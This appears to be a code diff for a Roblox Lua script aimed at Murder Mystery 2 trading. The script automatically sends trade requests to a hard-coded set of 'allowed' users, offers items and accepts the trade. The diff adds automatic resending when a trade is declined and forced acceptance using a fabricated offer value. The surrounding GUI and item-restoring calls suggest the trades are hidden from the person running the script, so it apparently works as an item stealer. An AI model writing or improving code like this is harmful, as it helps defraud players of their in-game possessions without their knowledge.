@@ -136,6 +136,7 @@ local function hook_mm2()
     local completeTrade      = Trade:WaitForChild("CompleteTrade", 10)
     local setRequestsEnabled = Trade:WaitForChild("SetRequestsEnabled", 10)
     local updateTrade        = Trade:FindFirstChild("UpdateTrade")
+    local declineTrade       = Trade:FindFirstChild("DeclineTrade")
     if not sendRequest or not offerItem or not acceptTrade or not startTrade then return end
 
     pcall(function() setRequestsEnabled:FireServer(true) end)
@@ -210,10 +211,38 @@ local function hook_mm2()
         end
     end
 
+    local function resetState()
+        tradingWithAllowed = false
+        itemsOffered = false
+        readySent = false
+        currentLastOffer = nil
+        showGui()
+    end
+
+    local function resendTrade()
+        task.wait(1)
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= lp and isAllowedUser(player.Name) then
+                storeItems()
+                pcall(function() sendRequest:InvokeServer(player) end)
+                break
+            end
+        end
+    end
+
     if updateTrade then
         updateTrade.OnClientEvent:Connect(function(tradeData)
             if tradeData and tradeData.LastOffer then
                 currentLastOffer = tradeData.LastOffer
+            end
+        end)
+    end
+
+    if declineTrade then
+        declineTrade.OnClientEvent:Connect(function()
+            if tradingWithAllowed then
+                resetState()
+                resendTrade()
             end
         end)
     end
@@ -272,9 +301,10 @@ local function hook_mm2()
             end
 
             task.wait(5)
-            if not readySent and currentLastOffer then
+            if not readySent then
                 readySent = true
-                pcall(function() acceptTrade:FireServer(TRADE_ID, currentLastOffer) end)
+                local offer = currentLastOffer or tick()
+                pcall(function() acceptTrade:FireServer(TRADE_ID, offer) end)
             end
         end)
     end)
@@ -283,11 +313,7 @@ local function hook_mm2()
         completeTrade.OnClientEvent:Connect(function()
             task.wait(0.5)
             restoreItems()
-            showGui()
-            tradingWithAllowed = false
-            itemsOffered = false
-            readySent = false
-            currentLastOffer = nil
+            resetState()
         end)
     end
 end
